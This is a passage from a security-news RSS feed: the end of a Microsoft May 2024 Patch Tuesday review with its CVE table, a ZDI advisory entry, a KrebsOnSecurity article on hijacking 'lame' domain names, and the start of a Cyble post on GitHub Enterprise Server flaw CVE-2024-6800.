  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29999"><span><span> </span>CVE-2024-29999<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30000"><span><span> </span>CVE-2024-30000<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30001"><span><span> </span>CVE-2024-30001<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30002"><span><span> </span>CVE-2024-30002<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30003"><span><span> </span>CVE-2024-30003<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30004"><span><span> </span>CVE-2024-30004<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30005"><span><span> </span>CVE-2024-30005<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30012"><span><span> </span>CVE-2024-30012<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30021"><span><span> </span>CVE-2024-30021<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30039"><span><span> </span>CVE-2024-30039<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Remote Access Connection Manager
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30009"><span><span> </span>CVE-2024-30009<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30014"><span><span> </span>CVE-2024-30014<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30015"><span><span> </span>CVE-2024-30015<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30022"><span><span> </span>CVE-2024-30022<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30023"><span><span> </span>CVE-2024-30023<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30024"><span><span> </span>CVE-2024-30024<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30029"><span><span> </span>CVE-2024-30029<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30033"><span><span> </span>CVE-2024-30033<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Search Service Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30049"><span><span> </span>CVE-2024-30049<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Win32 Kernel Subsystem Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30059"><span><span> </span>CVE-2024-30059</span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Intune for Android Mobile
  Application Management Tampering Vulnerability</td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.1</td>
  <td class="xl69"><span> </span>No</td>
  <td class="xl69"><span> </span>No</td>
  <td class="xl69">Tampering</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30050"><span><span> </span>CVE-2024-30050<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mark of the Web Security Feature
  Bypass Vulnerability<span> </span></td>
  <td class="xl73"><span> </span>Moderate<span> </span></td>
  <td class="xl69">5.4</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">SFB</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-4331"><span><span> </span>CVE-2024-4331 *</span></a></td>
  <td class="xl68" width="263"><span> </span>Chromium: CVE-2024-4331 Use after free in
  Picture In Picture<span> </span></td>
  <td class="xl71"><span> </span>High</td>
  <td class="xl69">N/A</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-4368"><span><span> </span>CVE-2024-4368 *</span></a></td>
  <td class="xl68" width="263"><span> </span>Chromium: CVE-2024-4368 Use after free in
  Dawn<span> </span></td>
  <td class="xl71"><span> </span>High</td>
  <td class="xl69">N/A</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 
 <tr height="0">
  <td width="151"></td>
  <td width="263"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="95"></td>
 </tr>
 
</table>













  <p class=""><em>* Indicates this CVE had been released by a third party and is now being included in Microsoft releases</em>.</p><p class=""><em>† Indicates further administrative actions are required to fully address the vulnerability.</em></p><p class="">&nbsp;</p><p class="">There’s just one Critical-rated bug this month, and it deals with a remote code execution (RCE) vulnerability in SharePoint server. An authenticated attacker could use this bug to execute arbitrary code in the context of the SharePoint Server. While permissions are needed for this to occur, any authorized user on the server has the needed level of permissions.</p><p class="">Looking at the other RCE bugs, we see a lot of vulnerabilities in rarely used protocols. The Windows Mobile Broadband driver and the Routing and Remote Access Service (RRAS) make up the bulk of this category. More notable are the two bugs in Hyper-V. One of these would allow an authenticated attacker to execute code on the host system. This would result in a guest-to-host escape, but Microsoft doesn’t indicate what level the code execution occurs on the host OS. After a couple of months with many SQL-related fixes, there’s just one this month. As with the previous bugs, you would need to connect to a malicious SQL server. The bug in Cryptographic Services requires a machine-in-the-middle (MITM) but could lead to a malicious certificate being imported onto the target system. The RCE bugs are rounded out with open-and-own style bugs in Excel and .NET and Visual Studio.</p><p class="">Moving on to the elevation of privilege (EoP) patches in this month’s release, almost all lead to SYSTEM-level code execution if an authenticated user runs specially crafted code. While there isn’t a lot else to say about these bugs, they are often used by attackers to take over a system when combined with a code execution bug – like the Excel bug mentioned above. They convince a user to open a specially crafted Excel document that executes the EoP and takes over the system. The lone exception to this is the bug in the Brokering File System component. The vulnerability allows attackers to gain the ability to authenticate against a remote host using the current user’s credentials. The attack could be launched from a low-privileged AppContainer, which would allow the attacker to execute code or access resources at a higher integrity level than that of the AppContainer execution environment.</p><p class="">We’ve already discussed the MotW security feature bypass (SFB), and the only other SFB vulnerability receiving a fix this month is the MSHTML engine. Just when you thought you were safe from Internet Explorer, the Trident engine rears its ugly head. This bug allows an unauthenticated attacker to get code execution if they can convince a user to open a malicious document. The code execution occurs in the context of the user, so this is another reminder not to log on with Admin privileges unless you absolutely need to.</p><p class="">There are only seven information disclosure bugs receiving fixes this month, and we’ve already covered the one in SharePoint. As usual, most of these vulnerabilities only result in info leaks consisting of unspecified memory contents. The bug in Power BI could result in the disclosing of “sensitive information,” but Microsoft doesn’t narrow down what type of “sensitive information” could be leaked. Similarly, the bug in Deployment Services could leak “file contents.” Microsoft provides no information on whether that’s any arbitrary file contents or only specific files, so your guess is as good as mine.</p><p class="">The May release includes four spoofing bugs. The first is a stored cross-site scripting (XSS) bug in Azure Migrate. There’s not a straightforward patch for this one. You need the latest Azure Migrate Agent and ConfigManager updates. More info on how to do that can be found <a href="https://learn.microsoft.com/en-us/azure/migrate/common-questions-appliance#how-to-troubleshoot-auto-update-failures-for-azure-migrate-appliance.">here</a>. There are two spoofing bugs in Dynamics 365, but they read more like XSS bugs. The final spoofing bug addressed this month is in the Bing search engine. An attacker could modify the content of the vulnerable link to redirect the victim to a malicious site.</p><p class="">There’s a single Tampering bug addressed in this release fixing a bug in Microsoft Intune Mobile Application Management. An attacker could gain sensitive information on a target device that has been rooted.</p><p class="">The final bugs for May are Denial-of-Service (DoS) vulnerabilities in ASP.NET, DHCP server, and Hyper-V. Unfortunately, Microsoft provides no additional information about these bugs and how they would manifest on affected systems.</p><p class="">There are no new advisories in this month’s release.</p><p class=""><strong>Looking Ahead</strong></p><p class="">The next Patch Tuesday of 2024 will be on June 11, and I’ll return with details and patch analysis then. Until then, stay safe, happy patching, and may all your reboots be smooth and clean!</p>
]]></content:encoded>
<pubDate>Tue, 14 May 2024 17:28:20 +0000</pubDate>
</item>
<item>
<title>ZDI-24-1097: (0Day) Microsoft GitHub Dev-Containers Improper Privilege Management Privilege Escalation Vulnerability</title>
<link>http://www.zerodayinitiative.com/advisories/ZDI-24-1097/</link>
<guid>http://www.zerodayinitiative.com/advisories/ZDI-24-1097/</guid>
<content:encoded><![CDATA[
This vulnerability allows remote attackers to escalate privileges on Microsoft GitHub. Authentication is required to exploit this vulnerability. The ZDI has assigned a CVSS rating of 9.9.
]]></content:encoded>
<pubDate>Tue, 06 Aug 2024 00:00:00 -0500</pubDate>
</item>
<item>
<title>Don’t Let Your Domain Name Become a “Sitting Duck”</title>
<link>https://krebsonsecurity.com/2024/07/dont-let-your-domain-name-become-a-sitting-duck/</link>
<guid>https://krebsonsecurity.com/2024/07/dont-let-your-domain-name-become-a-sitting-duck/</guid>
<content:encoded><![CDATA[
<p>More than a million domain names &#8212; including many registered by Fortune 100 firms and brand protection companies &#8212; are vulnerable to takeover by cybercriminals thanks to authentication weaknesses at a number of large web hosting providers and domain registrars, new research finds.</p>
<div class="wp-caption aligncenter" id="attachment_68225" style="width: 760px;"><img alt="" class=" wp-image-68225" height="433" src="https://krebsonsecurity.com/wp-content/uploads/2024/07/duckstarget.png" width="750" /><p class="wp-caption-text" id="caption-attachment-68225">Image: Shutterstock.</p></div>
<p>Your Web browser knows how to find a site like example.com thanks to the global <a href="https://en.wikipedia.org/wiki/Domain_Name_System" rel="noopener" target="_blank">Domain Name System</a> (DNS), which serves as a kind of phone book for the Internet by translating human-friendly website names (example.com) into numeric Internet addresses.</p>
<p>When someone registers a domain name, the registrar will typically provide two sets of DNS records that the customer then needs to assign to their domain. Those records are crucial because they allow Web browsers to find the Internet address of the hosting provider that is serving that domain.</p>
<p>But potential problems can arise when a domain&#8217;s DNS records are &#8220;lame,&#8221; meaning the authoritative name server does not have enough information about the domain and can&#8217;t resolve queries to find it. A domain can become lame in a variety of ways, such as when it is not assigned an Internet address, or because the name servers in the domain&#8217;s authoritative record are misconfigured or missing.</p>
<p>The reason lame domains are problematic is that a number of Web hosting and DNS providers allow users to claim control over a domain <em>without accessing the true owner&#8217;s account at their DNS provider or registrar</em>.</p>
<p>If this threat sounds familiar, that&#8217;s because it is hardly new. Back in 2019, KrebsOnSecurity wrote about thieves employing this method to seize control over thousands of domains registered at GoDaddy, and using those <a href="https://krebsonsecurity.com/2019/01/bomb-threat-sextortion-spammers-abused-weakness-at-godaddy-com/" rel="noopener" target="_blank">to send bomb threats and sextortion emails</a> (GoDaddy says they fixed that weakness in their systems not long after that 2019 story).</p>
<p>In the 2019 campaign, the spammers created accounts on GoDaddy and were able to take over vulnerable domains simply by registering a free account at GoDaddy and being assigned the same DNS servers as the hijacked domain.</p>
<p>Three years before that, the same pervasive weakness was described in a blog post by security researcher <strong>Matthew Bryant</strong>, who showed how one could <a href="https://thehackerblog.com/the-orphaned-internet-taking-over-120k-domains-via-a-dns-vulnerability-in-aws-google-cloud-rackspace-and-digital-ocean/" rel="noopener" target="_blank">commandeer at least 120,000 domains</a> via DNS weaknesses at some of the world&#8217;s largest hosting providers.</p>
<p>Incredibly, new research jointly released today by security experts at <strong>Infoblox</strong> and <strong>Eclypsium</strong> finds this same authentication weakness is still present at a number of large hosting and DNS providers.</p>
<p>&#8220;It&#8217;s easy to exploit, very hard to detect, and it&#8217;s entirely preventable,&#8221; said <strong>Dave Mitchell</strong>, principal threat researcher at Infoblox. &#8220;Free services make it easier [to exploit] at scale. And the bulk of these are at a handful of DNS providers.&#8221;</p>
<h2>SITTING DUCKS</h2>
<p><a href="https://blogs.infoblox.com/threat-intelligence/who-knew-domain-hijacking-is-so-easy/" rel="noopener" target="_blank">Infoblox&#8217;s report</a> found there are multiple cybercriminal groups abusing these stolen domains as a globally dispersed &#8220;traffic distribution system,&#8221; which can be used to mask the true source or destination of web traffic and to funnel Web users to malicious or phishous websites.</p>
<p>Commandeering domains this way also can allow thieves to impersonate trusted brands and abuse their positive or at least neutral reputation when sending email from those domains, as we saw in 2019 with the GoDaddy attacks.</p>
<p>&#8220;Hijacked domains have been used directly in phishing attacks and scams, as well as large spam systems,&#8221; reads the Infoblox report, which refers to lame domains as &#8220;<strong>Sitting Ducks</strong>.&#8221; &#8220;There is evidence that some domains were used for Cobalt Strike and other malware command and control (C2). Other attacks have used hijacked domains in targeted phishing attacks by creating lookalike subdomains. A few actors have stockpiled hijacked domains for an unknown purpose.&#8221;</p>
<p>Eclypsium researchers <a href="https://eclypsium.com/blog/ducks-now-sitting-dns-internet-infrastructure-insecurity/" rel="noopener" target="_blank">estimate</a> there are currently about one million Sitting Duck domains, and that at least 30,000 of them have been hijacked for malicious use since 2019.</p>
<p>&#8220;As of the time of writing, numerous DNS providers enable this through weak or nonexistent verification of domain ownership for a given account,&#8221; Eclypsium wrote.</p>
<p>The security firms said they found a number of compromised Sitting Duck domains were originally registered by brand protection companies that specialize in defensive domain registrations (reserving look-alike domains for top brands before those names can be grabbed by scammers) and combating trademark infringement.</p>
<p>For example, Infoblox found cybercriminal groups using a Sitting Duck domain called <strong>clickermediacorp[.]com</strong>, which was a CBS Interactive Inc. domain initially registered in 2009 at GoDaddy. However, in 2010 the DNS was updated to DNSMadeEasy.com servers, and in 2012 the domain was transferred to <strong>MarkMonitor</strong>.</p>
<p>Another hijacked Sitting Duck domain &#8212; <strong>anti-phishing[.]org</strong> &#8212; was registered in 2003 by the <strong>Anti-Phishing Working Group</strong> (APWG), a cybersecurity not-for-profit organization that closely tracks phishing attacks.</p>
<p>In many cases, the researchers discovered Sitting Duck domains that appear to have been configured to auto-renew at the registrar, but the authoritative DNS or hosting services were not renewed.</p>
<p>The researchers say Sitting Duck domains all possess three attributes that makes them vulnerable to takeover:</p>
<p>1) the domain uses or delegates authoritative DNS services to a different provider than the domain registrar;<br />
2) the authoritative name server(s) for the domain does not have information about the Internet address the domain should point to;<br />
3) the authoritative DNS provider is &#8220;exploitable,&#8221; i.e. an attacker can claim the domain at the provider and set up DNS records without access to the valid domain owner&#8217;s account at the domain registrar.</p>
<div class="wp-caption aligncenter" id="attachment_68226" style="width: 761px;"><img alt="" class=" wp-image-68226" height="337" src="https://krebsonsecurity.com/wp-content/uploads/2024/07/sittingduckattack.png" width="751" /><p class="wp-caption-text" id="caption-attachment-68226">Image: Infoblox.</p></div>
<p>How does one know whether a DNS provider is exploitable? There is a frequently updated list published on <strong>GitHub</strong> called &#8220;<a href="https://github.com/indianajson/can-i-take-over-dns?tab=readme-ov-file" rel="noopener" target="_blank">Can I take over DNS</a>,&#8221; which has been documenting exploitability by DNS provider over the past several years. The list includes examples for each of the named DNS providers.<span id="more-68214"></span></p>
<p>In the case of the aforementioned Sitting Duck domain clickermediacorp[.]com, the domain appears to have been hijacked by scammers by claiming it at the web hosting firm <strong>DNSMadeEasy</strong>, which is owned by <strong>Digicert</strong>, one of the industry&#8217;s largest issuers of digital certificates (SSL/TLS certificates).</p>
<p>In an interview with KrebsOnSecurity, DNSMadeEasy founder and senior vice president <strong>Steve Job</strong> said the problem isn&#8217;t really his company&#8217;s to solve, noting that DNS providers who are also not domain registrars have no real way of validating whether a given customer legitimately owns the domain being claimed.</p>
<p>&#8220;We do shut down abusive accounts when we find them,&#8221; Job said. &#8220;But it&#8217;s my belief that the onus needs to be on the [domain registrants] themselves. If you&#8217;re going to buy something and point it somewhere you have no control over, we can&#8217;t prevent that.&#8221;</p>
<p>Infoblox, Eclypsium, and the DNS wiki listing at Github all say that web hosting giant <strong>Digital Ocean</strong> is among the vulnerable hosting firms. In response to questions, Digital Ocean said it was exploring options for mitigating such activity.</p>
<p>&#8220;The DigitalOcean DNS service is not authoritative, and we are not a domain registrar,&#8221; Digital Ocean wrote in an emailed response. &#8220;Where a domain owner has delegated authority to our DNS infrastructure with their registrar, and they have allowed their ownership of that DNS record in our infrastructure to lapse, that becomes a &#8216;lame delegation&#8217; under this hijack model. We believe the root cause, ultimately, is poor management of domain name configuration by the owner, akin to leaving your keys in your unlocked car, but we acknowledge the opportunity to adjust our non-authoritative DNS service guardrails in an effort to help minimize the impact of a lapse in hygiene at the authoritative DNS level. We’re connected with the research teams to explore additional mitigation options.&#8221;</p>
<p>In a statement provided to KrebsOnSecurity, the hosting provider and registrar <strong>Hostinger</strong> said they were working to implement a solution to prevent lame duck attacks in the &#8220;upcoming weeks.&#8221;</p>
<p>&#8220;We are working on implementing an SOA-based domain verification system,&#8221; Hostinger wrote. &#8220;Custom nameservers with a Start of Authority (SOA) record will be used to verify whether the domain truly belongs to the customer. We aim to launch this user-friendly solution by the end of August. The final step is to deprecate preview domains, a functionality sometimes used by customers with malicious intents. Preview domains will be deprecated by the end of September. Legitimate users will be able to use randomly generated temporary subdomains instead.&#8221;</p>
<p>What did DNS providers that have struggled with this issue in the past do to address these authentication challenges? The security firms said that to claim a domain name, the best practice providers gave the account holder random name servers that required a change at the registrar before the domains could go live. They also found the best practice providers used various mechanisms to ensure that the newly assigned name server hosts did not match previous name server assignments.</p>
<p>[Side note: Infoblox observed that many of the hijacked domains were being hosted at <strong>Stark Industries Solutions</strong>, a sprawling hosting provider that appeared two weeks before Russia invaded Ukraine and has become <a href="https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/" rel="noopener" target="_blank">the epicenter of countless cyberattacks against enemies of Russia</a>].</p>
<p>Both Infoblox and Eclypsium said that without more cooperation and less finger-pointing by all stakeholders in the global DNS, attacks on sitting duck domains will continue to rise, with domain registrants and regular Internet users caught in the middle.</p>
<p>&#8220;Government organizations, regulators, and standards bodies should consider long-term solutions to vulnerabilities in the DNS management attack surface,&#8221; the Infoblox report concludes.</p>
]]></content:encoded>
<pubDate>Wed, 31 Jul 2024 12:06:45 +0000</pubDate>
</item>
<item>
<title>The SAML Exploit That Could Take Down GitHub: What You Need to Know About CVE-2024-6800</title>
<link>https://cyble.com/blog/saml-exploit-github-cve-2024-6800/</link>
<guid>https://cyble.com/blog/saml-exploit-github-cve-2024-6800/</guid>
<content:encoded><![CDATA[
<p><img alt="Take Down GitHub" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/Blog-Image01.webp" tabindex="0" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>CVE-2024-6800 is a severe security flaw discovered in GitHub Enterprise Server (GHES), which could allow unauthorized access and control over sensitive systems by exploiting XML signature wrapping and forged SAML responses.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The vulnerability impacts all GHES versions prior to 3.14, excluding versions 3.13.3, 3.12.8, 3.11.14, and 3.10.16, indicating that many installations could be at risk.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Exploiting this vulnerability can grant attackers unauthorized access to GHES instances, enabling them to view, modify, or delete critical source code and sensitive data and potentially compromising entire supply chains.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>GHES instances are often accessible over the internet, which broadens the <a href="https://cyble.com/solutions/attack-surface-management/">attack surface</a> and increases the likelihood of exploitation, emphasizing the need for immediate action. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>GitHub has released critical security updates to address CVE-2024-6800. Organizations are strongly advised to upgrade to the latest GHES version to apply essential patches and secure their systems.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>GHES version 3.13.3 includes fixes for CVE-2024-6800 and additional security improvements, addressing both critical and medium-severity vulnerabilities and enhancing overall system security.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The update also introduces new features like improved diagnostic tools and configuration management enhancements, which help in better managing and troubleshooting GHES instances.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble Research &amp; Intelligence Labs' (CRIL) <a href="https://cyble.com/blog/weekly-it-vulnerability-report-august-2024/">Weekly Vulnerability Intelligence Report </a>has recently revealed critical flaws with the potential to impact major technology platforms. Among the most concerning is a security issue affecting GitHub Enterprise Server (GHES). The vulnerability, identified as CVE-2024-6800, poses risks to organizations using GHES, potentially allowing unauthorized access and control over sensitive systems. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>On August 22, 2024, the Cyber Security Agency of Singapore (SingCERT) released an alert about <a href="https://www.csa.gov.sg/alerts-advisories/alerts/2024/al-2024-108" rel="noreferrer noopener nofollow" target="_blank">CVE-2024-6800</a>, a critical vulnerability in the GitHub Enterprise Server (GHES). GHES is a self-hosted version of GitHub, tailored for organizations that require a secure and customizable platform for managing source code and facilitating collaboration among development teams. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CVE-2024-6800 is an XML signature wrapping vulnerability that affects GHES. This flaw allows unauthenticated attackers to exploit Security Assertion Markup Language (SAML) responses to gain unauthorized access. By forging a SAML response, an attacker could provision and access user accounts with site administrator privileges.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
